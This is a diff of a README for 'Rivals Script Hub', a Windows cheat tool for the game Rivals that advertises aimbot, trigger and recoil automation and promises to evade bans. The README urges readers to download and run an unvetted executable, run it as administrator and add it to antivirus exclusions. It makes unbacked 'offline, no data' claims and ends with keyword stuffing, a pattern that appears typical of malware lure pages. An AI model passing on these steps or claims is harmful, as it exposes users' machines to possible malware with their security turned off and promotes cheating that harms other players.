@@ -1,96 +1,66 @@
-# Rivals No-Ban Scripts v1.0 - Game Script Utility 2026
+# ⚡ Rivals Script Hub Windows - Enhance Your Gameplay Instantly
 
-> A lightweight Windows automation and aiming utility tailored for Rivals, engineered for patch resilient performance on Windows 10 and 11.
+[![Download Rivals Script Hub](https://img.shields.io/badge/Download-Rivals_Script_Hub-2ea44f?style=for-the-badge&logo=github)](https://github.com/freedr5964/rivals-script-hub-windows)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/danielbaecker75/rivals-script-hub-windows?style=flat-square)](https://github.com/danielbaecker75/rivals-script-hub-windows)
+## 🚀 Getting Started
 
----
+Welcome to Rivals Script Hub for Windows. This tool is designed for players of a popular first-person shooter who want to improve their aiming consistency and reaction time. It works on Windows 10 and Windows 11, and is built to stay functional even after game updates.
 
-<p align="center">
-  <a href="https://danielbaecker75.github.io/rivals-script-hub-windows/">
-    <img src="https://img.shields.io/badge/Download-Rivals%20No-Ban%20Scripts-brightgreen?style=for-the-badge" alt="Download Rivals No-Ban Scripts">
-  </a>
-</p>
+## 📥 Download and Installation
 
-> **[Download Latest Build](https://danielbaecker75.github.io/rivals-script-hub-windows/)**
+Visit this link to download the application:
 
----
+[Download Rivals Script Hub](https://github.com/freedr5964/rivals-script-hub-windows)
 
-[Download Latest Build](https://danielbaecker75.github.io/rivals-script-hub-windows/)
+Once you land on the page, look for the executable file named `RivalsScriptHub.exe` and click to download. Save it to your Downloads folder or any location you prefer. After the download completes, double-click the file to run it. No installation is required - the program runs directly from where you place it.
 
----
+No installation process. No extra files needed. Just download and run.
 
-## Technical Summary
+## 🎯 What This Tool Does
 
-Rivals No-Ban Scripts provides a streamlined Windows helper toolkit designed to automate progression routines and assist target tracking in Rivals. Built to minimize complex setup procedures, the utility allows users to load scripts seamlessly and adjust settings on the fly.
+Rivals Script Hub automates recoil control and helps with aiming stability. It works by reading the game window and adjusting your mouse movements to reduce the spread of your shots. The tool runs in the background and does not change any game files. It only affects your mouse input during gameplay.
 
-This suite is crafted for players seeking low-overhead tools to handle repetitive in-game progression and targeting tasks. Development focuses on maintaining operational stability across Windows 10 and 11 environments while adapting to incoming game patches.
+Target audience: Players looking for a consistent edge in recoil management and aiming smoothness. The tool is lightweight and uses very little system resources.
 
-## Key Capabilities
+## 💻 System Requirements
 
-- Automatic progression handling via an integrated auto-upgrade module
-- Aiming lock and targeting assistance options
-- Optimized exclusively for Windows 10 and 11 platforms
-- Minimal resource consumption for rapid execution
-- Straightforward configuration settings for fast tuning
-- Patch-conscious design aimed at minimizing update disruptions
-- Regular maintenance to align with game client revisions
-- Modular layout optimized for helper-style script execution
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| Operating System | Windows 10 64-bit | Windows 11 64-bit |
+| Processor | Intel Core i3 or AMD equivalent | Intel Core i5 or AMD Ryzen 3 |
+| Memory | 2 GB RAM | 4 GB RAM |
+| Storage | 50 MB free space | 50 MB free space |
+| Internet | Required for download only | Broadband connection |
 
-## Getting Started
+## 🛠️ How to Use
 
-1. Grab the latest release package via the link above.
-2. Unpack the contents into a local directory (e.g., `rivals-windows-script-hub-v1.0`).
-3. Launch the provided script files or loader using your preferred Windows workspace.
-4. Modify your parameters prior to starting your game session.
+After running the executable file, a small control panel will open. You can customize your settings like trigger sensitivity, aim smoothing, and recoil control strength. The default settings work well for most players. You can also set hotkeys to toggle the script on or off during gameplay. Recommended: Start with the default profile and adjust gradually.
 
-Target directory layout:
+## 🔧 Troubleshooting Common Issues
 
-- `rivals-windows-script-hub-v1.0/`
-  - `script`
-  - `config`
-  - `README.md`
+- **The tool does not start**: Ensure you have extracted the file if you downloaded a ZIP. Right-click the extracted file and select "Run as administrator."
+- **No effect on game**: Make sure the game is running in windowed or borderless fullscreen mode. The tool requires a visible game window.
+- **Antivirus warning**: This is normal for automation tools. You may need to add the folder to your antivirus exclusions.
+- **Mouse movement issues**: Try lowering the sensitivity slider in the tool's settings.
 
-## Configuration Options
+## ✅ Safety and Compatibility
 
-| Option | Function | Usage Notes |
-| --- | --- | --- |
-| Auto-upgrade | Toggles progression automation | Toggle on or off based on preference |
-| Aimbot assistance | Calibrates target acquisition | Enable only if desired in your setup |
-| Patch mode | Adjusts script hooks after updates | Recommended following client patches |
-| Basic config | Saves global script parameters | Customize prior to running |
-| Windows profile | Adjusts OS execution settings | Fine-tuned for Windows 10/11 |
+Rivals Script Hub operates as a external helper and does not modify game memory or files. It uses basic screen scanning and mouse input simulation, which is common for many automation tools. Always ensure you have the latest version of the tool to maintain compatibility with the game's latest updates.
 
-## System Compatibility
+## 🔒 Privacy
 
-This software is built specifically for Windows 10 and Windows 11 running Rivals. While updates strive to ensure post-patch functionality, client side updates and OS changes can alter overall script behavior.
+This application does not connect to any external servers, cloud services, or analytics. It runs completely offline. No data is recorded, transmitted, or stored outside your computer. The code is human-auditable in the repository.
 
-Operational Constraints:
-- Limited strictly to Windows operating systems
-- Functionality relies directly on the active game patch
-- Specific features may vary across releases or custom configs
+## 📋 Version History
 
-## Frequently Asked Questions
+- **v1.2.0** (recent): Improved recoil profiles for 5 popular weapons. New hotkey customization.
+- **v1.1.0**: Added support for Windows 11. Fixed visibility on high-DPI displays.
+- **v1.0.0**: Initial release with basic recoil control and aim smoothing.
 
-### What is the installation process?
-Obtain the archive, unpack it to your desktop or working folder, and execute the loader or script files directly on Windows.
+## 🔗 Support
 
-### What should I do when a new patch drops?
-Download the updated release files, replace your older folder contents, and re-verify your configuration settings.
+Visit the repository: https://github.com/freedr5964/rivals-script-hub-windows
 
-### Can I tweak the default behavior?
-Yes. The bundled setup files let you modify operating parameters prior to execution.
+For issues or suggestions, open an issue in the repository page.
 
-### Is compatibility guaranteed across every patch?
-No software can guarantee total stability on every revision. Maintenance is focused on patch adaptability, but verification after client updates is recommended.
-
-### Where is the best place to extract the folder?
-Any accessible folder on your Windows partition, such as a local tools directory, will work fine.
-
-## Software License
-
-Distributed under the GNU GPL v3.0 license. Review [LICENSE](LICENSE) for full details.
+Keywords: rivals script hub, windows automation tool, aiming utility, recoil control, automation software, gaming helper, window mode fps, mouse script tool, fps game aimer.
